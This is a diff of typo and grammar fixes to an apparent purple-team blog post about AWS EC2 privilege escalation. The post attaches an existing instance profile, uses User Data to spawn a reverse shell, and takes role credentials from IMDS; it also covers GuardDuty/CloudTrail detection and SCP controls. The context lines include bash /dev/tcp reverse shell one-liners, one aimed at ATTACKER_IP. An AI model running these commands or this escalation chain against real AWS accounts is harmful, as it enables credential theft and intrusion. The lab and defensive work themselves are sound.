@@ -101,7 +101,7 @@
         <div class="col-lg-8 col-md-10 mx-auto">
           <p>I have recently started looking into AWS security for work and came across this <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/" target="_blank">Rhino Labs AWS Privilege Escalation</a> blog post. It is a few years old, but still looks relevant and I noticed that the author is also the founding dev of the <a href="https://github.com/RhinoSecurityLabs/Pacu" target="_blank">Pacu</a> project... Seems like a great person to learn from! I have decided I will be doing deep dives on some of the techniques described in the blog post to get up to speed with some of the privesc techniques in AWS, starting with... 
 
-          <p>The 3rd escalation technique mentioned: "Creating an EC2 instance with an existing instance profile". It mentions spinning up an EC2 instance, but using an existing EC2 instance profile which has higher privileges in the account. You then need to find a way to log into the EC2 to request the AWS keys associated with the EC2 instance profile using the EC2 Instance Meta Data API. In the Rhino Labs blog they mention using EC2 user data to get a reverse shell from the instance, which is more exciting than SSH or SSM, so this blog covers this method.</p>
+          <p>The 3rd escalation technique mentioned: "Creating an EC2 instance with an existing instance profile". It mentions spinning up an EC2 instance, but using an existing EC2 instance profile which has higher privileges in the account. You then need to find a way to log into the EC2 to request the AWS keys associated with the EC2 instance profile using the EC2 Instance Metadata API. In the Rhino Labs blog they mention using EC2 user data to get a reverse shell from the instance, which is more exciting than SSH or SSM, so this blog covers this method.</p>
 
           <p>Because this blog is about purple teaming, it will also cover how to detect someone doing this and how the AWS account can be setup to prevent an attacker from executing this privesc attack chain.</p>
 
@@ -113,7 +113,7 @@
           
           <p>The IMDS (Instance Metadata Service) listens on the link-local address: <inline-code>169.254.169.254</inline-code> on every EC2 instance. This service is used to retrieve the temporary credentials for the IAM role attached through the instance profile. For example, imagine a Python script running on an EC2 instance that needs to write data to an S3 bucket. The script uses the Boto library, which must determine how to authenticate. It would usually check environment variables and the local AWS credentials file, but when running on EC2 or ECS it will automatically query IMDS for credentials. IMDS then requests temporary credentials from STS for the role associated with the instance profile and returns them to the application. With these credentials, and assuming the role’s IAM policy and the S3 bucket policy permit access, the Python script can write to the S3 bucket. <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" target="_blank">ref</a></p>
 
-          <h2 class="section-heading">Steeling Instance Profiles</h2>
+          <h2 class="section-heading">Stealing Instance Profiles</h2>
 
           <p>
             In practice there are not many controls that limit which instance profiles can be attached to an EC2 instance. One common approach is to create roles for developers and restrict which roles their EC2 instances can use with <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_switch-role-ec2.html#roles-usingrole-ec2instance-permissions" target="_blank">PassRole</a>. However, if instance profiles already exist in the account, they can generally be attached to any EC2 instance that a user launches and restricting developers to explicit roles is poor developer experience.
@@ -122,7 +122,7 @@
 
             It is really worth keeping in mind that roles that you create for your EC2 instances can be hijacked by other users in the account if they can also spin up EC2 instances. But not every role can be hijacked, only roles that allow EC2 instances to assume them.
             <br><br>
-            Roles in the account or Service Control Policies (SCPs) can limit who can spin up EC2 instances. SCPs are defined at an organisation level and I did not test SCPs in this blog post. The below hypothetical SCP example would only allow roles that start with "CICD" to spin up EC2 instances and you could have additional controls in place in your repos to prevent malicious pull/merge requests. This is a pretty weak control though, if new roles can be created a user could just name it correcly to bypass this control. 
+            Roles in the account or Service Control Policies (SCPs) can limit who can spin up EC2 instances. SCPs are defined at an organisation level and I did not test SCPs in this blog post. The below hypothetical SCP example would only allow roles that start with "CICD" to spin up EC2 instances and you could have additional controls in place in your repos to prevent malicious pull/merge requests. This is a pretty weak control though, if new roles can be created a user could just name it correctly to bypass this control. 
           <p></p>
             
 <code>{
@@ -169,7 +169,7 @@
   ]
 }</code>
             <br>
-            I then create an EC2 instance and select this role so AWS created an instance profile (note: even after deleting the EC2 the instance profile will remain in the account). Next I spun up an EC2 instance to act as a shell receiver and another EC2 which used the previously created instance profile so would have permissions to read and write to the S3 bucket (lets call this EC2: "S3_reader"). I also set this EC2 instances' User Data to return a shell to the shell receiver (All security groups were setup to facilitate this and a nc listener was waiting for this connection): 
+            I then created an EC2 instance and selected this role so AWS created an instance profile (note: even after deleting the EC2 the instance profile will remain in the account). Next I spun up an EC2 instance to act as a shell receiver and another EC2 which used the previously created instance profile so would have permissions to read and write to the S3 bucket (let's call this EC2: "S3_reader"). I also set this EC2 instance's User Data to return a shell to the shell receiver (All security groups were setup to facilitate this and a nc listener was waiting for this connection): 
             
             <br><br>
 
@@ -232,7 +232,7 @@ bash -i >& /dev/tcp/172.31.34.136/60000 0>&1
 
         </br></br>
           
-            <li>We can not see STS credentials being requested via the IMDS because this is not logged. We would need a monitoring agent on the EC2 to see this activity.</li>
+            <li>We cannot see STS credentials being requested via the IMDS because this is not logged. We would need a monitoring agent on the EC2 to see this activity.</li>
             <li>In the S3 data events we can see the log that GuardDuty is likely using for its detection. Note that in the userIdentity the EC2 instance ID is shown in the principalId and arn, but the source IP is obviously not the EC2 instance and in this case the user agent is also dodgy: </li>
             <br>
             <code>
@@ -345,11 +345,10 @@ bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code>
           
           <h2 class="section-heading">Bonus Take Aways</h2>
 
-          <li>The instance profile associated with the EC2 is hot swappable, just call: <inline-code></inline-code>DisassociateIamInstanceProfile</inline-code> and <inline-code>AssociateIamInstanceProfile</inline-code></li>
+          <li>The instance profile associated with the EC2 is hot swappable, just call: <inline-code>DisassociateIamInstanceProfile</inline-code> and <inline-code>AssociateIamInstanceProfile</inline-code></li>
           <li>Calling: <inline-code>DisassociateIamInstanceProfile</inline-code> or <inline-code>AssociateIamInstanceProfile</inline-code> generates CloudTrail logs</li>
           <li>When an IAM role is revoked the STS creds associated with the role keep working until they expire</li>
           <li>When an IAM role is revoked the role stops working for the instance using the role, so any STS keys generated by the instance from that point on don't work. This can be fixed if the role is re-associated with the instance using the <inline-code>DisassociateIamInstanceProfile</inline-code>/<inline-code>AssociateIamInstanceProfile</inline-code> API calls.</li>
-
         </div>
       </div>
     </div>
